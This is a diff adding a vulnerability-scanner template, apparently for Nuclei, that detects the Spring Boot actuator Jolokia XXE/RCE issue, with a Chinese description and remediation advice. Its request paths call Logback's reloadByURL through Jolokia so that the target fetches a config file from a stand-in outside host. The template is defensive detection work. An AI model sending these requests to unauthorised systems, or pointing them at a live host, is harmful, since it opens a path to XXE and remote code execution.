@@ -1,0 +1,34 @@
+id: springboot-actuators-jolokia-xxe
+info:
+  name: Spring Boot Actuators (Jolokia) XXE
+  author:
+  - l0ne1y
+  description: |-
+    SpringBoot actuator Jolokia XXE RCE
+    Actuator 是 Spring Boot 提供的服务监控和管理中间件。当 Spring Boot 应用程序运行时，它会自动将多个端点注册到路由进程中。而由于对这些端点的错误配置，就有可能导致一些系统信息泄露、XXE、甚至是 RCE 等安全问题。
+  severity: high
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁
+
+    #### 临时修复方案：
+    1、升级系统至无漏洞版本，或于官网下载安全补丁
+    2、尽量避免使用XML传输数据。
+    3、对XML获取到的数据进行格式验证，如果有不符合格式的数据，应该禁止执行。
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    condition: and
+    part: body
+    words:
+    - http:\/\/nonexistent:31337\/logback.xml
+    - reloadByURL
+    - JoranException
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/nonexistent:31337!/logback.xml'
+  - '{{BaseURL}}/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/random:915!/logback.xml'
+  method: GET
